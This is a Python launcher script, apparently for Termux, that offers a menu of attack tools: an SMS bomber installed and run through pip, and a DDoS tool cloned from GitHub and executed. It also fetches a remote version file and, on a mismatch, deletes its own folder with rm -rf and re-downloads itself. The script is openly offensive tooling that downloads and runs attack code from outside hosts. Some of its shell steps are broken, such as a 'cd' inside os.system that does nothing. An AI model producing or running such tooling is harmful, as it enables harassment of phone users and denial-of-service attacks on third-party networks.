import os
versino_helpers = '2'
error = 0

def main():
    import os
    global error



    def download():
        os.system('pip install requests')
        os.system('clear')

    download()

    
    def check():
        global versino_helpers
        global error
        import requests

        version = requests.get('https://raw.githubusercontent.com/FroniYT/termux_helper/main/termux_version.txt').text

        if versino_helpers == version:
            error = '0'
        
        elif versino_helpers != version:
            error = '1'
    check()

    if error == '0':

        def helper():
            import os 
            
            connect = True

            while connect:
                termux_helper = input(' 1.Sms-Bomber \n 2.DDos attack Internet \n 3.Metosplite[beta] \n >>> ')

                if termux_helper == '1':
                    os.system('pip install db0mb3r -U')
                    os.system('b0mb3r')
                    os.system('clear')

                if termux_helper == '2':
                    DDos = input(' 1.Xerxes \n 2.hakddos ')

                    if DDos == '1':
                        os.system('echo soon')

                    if DDos == '2':
                        os.system(' git clone https://github.com/white-hackers/hakddos​')
                        os.system('cd hakddos ')
                        os.system('chmod +x hakddos.py')
                        os.system('python hakddos.py')


                if termux_helper == 'Stop':
                    connect = False


        helper()



    elif error == '1':
        os.system('cd')
        os.system('rm -rf dir termux_helper')
        os.system('git clone https://github.com/FroniYT/termux_helper')
        os.system('')







main()
